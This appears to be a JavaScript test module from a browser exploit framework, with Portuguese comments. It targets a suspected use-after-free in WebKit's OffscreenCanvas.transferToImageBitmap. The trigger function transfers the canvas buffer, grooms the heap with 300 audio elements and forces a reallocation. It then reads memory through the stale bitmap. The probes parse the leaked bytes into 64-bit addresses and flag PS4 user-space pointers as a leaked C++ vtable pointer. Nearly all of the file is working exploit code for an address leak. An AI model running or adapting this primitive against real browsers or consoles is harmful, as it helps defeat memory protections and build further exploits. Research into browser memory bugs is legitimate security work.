
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CANVAS_OFFSCREEN_TRANSFER_UAF',
    category: 'Graphics',
    risk:     'CRITICAL',
    description:
        'UAF / OOB via OffscreenCanvas.transferToImageBitmap(). ' +
        'O backing store do OffscreenCanvas é transferido (ownership move) para um ImageBitmap. ' +
        'Se o OffscreenCanvas for redimensionado síncronamente logo após o transfer, ' +
        'o WebKit pode realocar o backing store enquanto o ImageBitmap ainda aponta ' +
        'para o buffer original — criando uma janela UAF/dangling pointer. ' +
        'O Heap Feng Shui com elementos <audio> posiciona estruturas C++ ricas em ' +
        'vTable pointers adjacentes ao buffer libertado.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');

        // OffscreenCanvas não precisa de estar no DOM
        this.osc = new OffscreenCanvas(64, 64);
        this.ctx = this.osc.getContext('2d');

        // Pinta um padrão completamente ZERO para baseline limpa
        // Qualquer byte != 0 lido depois do transfer é candidato a leak
        this.ctx.clearRect(0, 0, 64, 64);

        // Canvas visível auxiliar para drawImage do ImageBitmap
        this.visCanvas = document.createElement('canvas');
        this.visCanvas.width  = 64;
        this.visCanvas.height = 64;
        this.sandbox.appendChild(this.visCanvas);
        this.visCtx = this.visCanvas.getContext('2d', { willReadFrequently: true });
    },

    trigger: function() {
        try {
            // 1. TRANSFER — move o backing store do OffscreenCanvas para o ImageBitmap
            //    Após este ponto, this.osc NÃO deve ter backing store válido
            this.results.bitmap = this.osc.transferToImageBitmap();

            // 2. HEAP FENG SHUI — preenche o buraco deixado pelo buffer transferido
            //    com estruturas HTMLMediaElement ricas em ponteiros vTable C++
            this.pointerTargets = [];
            for (let i = 0; i < 300; i++) {
                let el = document.createElement('audio');
                this.sandbox.appendChild(el);
                this.pointerTargets.push(el);
            }

            // 3. GATILHO DE REALLOC — força o OffscreenCanvas a realocar
            //    síncronamente um NOVO backing store (potencialmente sobreposto)
            this.osc.width  = 65; // dimensão ligeiramente diferente força realloc
            this.osc.height = 65;
            this.ctx = this.osc.getContext('2d');
            this.ctx.clearRect(0, 0, 65, 65);

            // 4. LEITURA via ImageBitmap — se o bitmap ainda apontar para o buffer
            //    antigo, o drawImage vai ler memória possivelmente reutilizada
            this.visCtx.drawImage(this.results.bitmap, 0, 0);

            // 5. Captura imediata — 8 pixels = 32 bytes = 4 ponteiros de 64-bits potenciais
            this.results.leaked = this.visCtx.getImageData(0, 0, 8, 1);

        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: Estado geral
        s => s.results.error || 'Transfer + Realloc aceite',

        // Probe 1: Extrator de endereços — varre os 8 pixels (32 bytes)
        s => {
            if (!s.results.leaked) return 'Sem dados lidos';

            let data     = s.results.leaked.data; // Uint8ClampedArray, 32 bytes
            let nonZero  = [];
            let leakAddr = null;

            // Varre os 4 grupos de 8 bytes (4 potenciais ponteiros de 64-bits)
            for (let ptr = 0; ptr < 4; ptr++) {
                let base = ptr * 8;
                // Low 32-bits (little-endian)
                let lo = (data[base+3] << 24) | (data[base+2] << 16) |
                         (data[base+1] <<  8) |  data[base+0];
                // High 32-bits
                let hi = (data[base+7] << 24) | (data[base+6] << 16) |
                         (data[base+5] <<  8) |  data[base+4];

                lo = lo >>> 0;
                hi = hi >>> 0;

                if (lo !== 0 || hi !== 0) {
                    nonZero.push({ ptr, lo, hi });
                    // Heurística: ponteiro de utilizador PS4 (FreeBSD AMD64)
                    // high == 0x00007FFF ou similar (canonical user address)
                    if (hi >= 0x00007F00 && hi <= 0x00007FFF) {
                        leakAddr = `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
                    }
                }
            }

            if (leakAddr) {
                return `💥 PONTEIRO C++ VAZADO: ${leakAddr}`;
            }
            if (nonZero.length > 0) {
                let summary = nonZero.map(n =>
                    `ptr[${n.ptr}]=0x${n.hi.toString(16)}${n.lo.toString(16)}`
                ).join(' | ');
                return `⚠️ Bytes não-nulos (possível leak): ${summary}`;
            }
            return 'Protegido / Apenas zeros';
        },

        // Probe 2: Raw dump dos primeiros 16 bytes para análise manual
        s => {
            if (!s.results.leaked) return 'N/A';
            let d = s.results.leaked.data;
            let hex = '';
            for (let i = 0; i < 16; i++) {
                hex += d[i].toString(16).padStart(2, '0') + ' ';
            }
            return `RAW[0..15]: ${hex.trim()}`;
        }
    ],

    cleanup: function() {
        try {
            if (this.results.bitmap) this.results.bitmap.close();
        } catch(e) {}
        try { this.visCanvas.remove(); } catch(e) {}
        if (this.pointerTargets) {
            this.pointerTargets.forEach(el => { try { el.remove(); } catch(e){} });
        }
        this.pointerTargets = null;
        this.osc            = null;
        this.ctx            = null;
        this.visCanvas      = null;
        this.visCtx         = null;
        this.results        = {};
    }
};
